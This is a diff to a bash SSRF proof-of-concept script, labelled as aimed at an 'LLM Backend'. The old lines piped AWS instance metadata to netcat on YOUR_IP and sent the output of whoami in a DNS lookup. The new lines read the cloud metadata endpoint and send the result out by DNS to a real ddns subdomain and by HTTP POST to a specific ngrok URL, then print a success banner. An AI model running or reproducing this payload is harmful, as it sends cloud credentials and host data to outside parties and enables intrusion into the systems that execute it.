@@ -1,11 +1,16 @@
-# Test 1: Basic Fetch + Echo
-curl -s https://norosec.xyz/ssrf-echo.txt | tee /tmp/ssrf-test
+#!/bin/bash
+echo "=== SSRF PoC HIT == $(date) == LLM Backend =="
 
-# Test 2: Metadata Exfil (AWS/EC2)
-curl -s http://169.254.169.254/latest/meta-data/ | nc YOUR_IP 4444
+# Blind DNS SSRF (MOST Reliable)
+SSRF_DATA=$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "metadata-blocked")
+nslookup "${SSRF_DATA// /.}".1003afc4aa.ddns.1433.eu.org.
 
-# Test 3: Blind SSRF (DNS/Log4Shell)
-curl http://$(whoami).YOUR_DOMAIN.com/
+# HTTP Exfil to your ngrok
+curl -s "http://localhost/admin" \
+  -X POST \
+  -d "{\"ssrf\":\"$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null)\"}" \
+  https://favourless-hattie-amphibians.ngrok-free.dev/log
 
-# Test 4: Internal Pivot
-curl -s http://localhost:8080/admin || curl http://127.0.0.1:80/
+# Echo proof
+curl -s https://norosec.xyz/ssrf-echo.txt
+echo "SSRF EXECUTED SUCCESSFULLY"
